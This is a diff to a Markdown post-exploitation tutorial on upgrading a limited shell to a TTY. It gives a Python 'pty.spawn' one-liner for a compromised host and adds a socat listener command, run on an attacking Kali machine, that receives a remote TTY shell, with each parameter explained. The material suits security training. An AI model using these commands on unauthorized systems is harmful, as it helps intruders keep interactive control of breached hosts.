@@ -5,8 +5,10 @@ A scenario you may encounter is that the limited shell you have access to may no
 TTY (Teletypewriter, or teletype) terminal support. Non-TTY shells have limited command line editing,
 no job control, incomplete output formatting, and missing signal handling, and they may not work in
 interactive applications such as text editors.
+
 <br>
 <br>
+
 A common approach to upgrade shell to a feature-rich TTY is by using pseudo-terminals (PTY). What a pseudo-terminal
 does is provide an interface through which processes can interact with a terminal-like device, allowing
 terminal-based applications, shells and other programs to operate as if they're connected to a physical terminal.
@@ -31,8 +33,10 @@ Type "help", "copyright", "credits" or "license" for more information.
 ```
 
 To exit the python console, enter `exit()`.
+
 <br>
 <br>
+
 On a compromised host with Python installed, you could elevate your shell with the following command:
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -45,3 +49,21 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 <br>
 
 ## Socat
+You can use *socat* to spawn TTY shells if the tool is available on **BOTH** the target and the attacking machine.
+Socat is generally used for bidirectional communication between two data channels.
+
+<br>
+<br>
+
+For example, run the following socat command on your attacking Kali machine to spawn a TTY shell:
+```
+socat file:$(tty),raw,echo=0 tcp-listen:1337
+```
+
+- The `file:` parameter uses the value of the `$(tty)` command, which expands to `/dev/pts/#`.
+- `raw`, or Raw mode, ensures that socat won't process input and output data.
+- `echo=0` disables socats local echoing.
+- `tcp-listen:1337` defines the local TCP listening port.
+
+<br>
+<br>
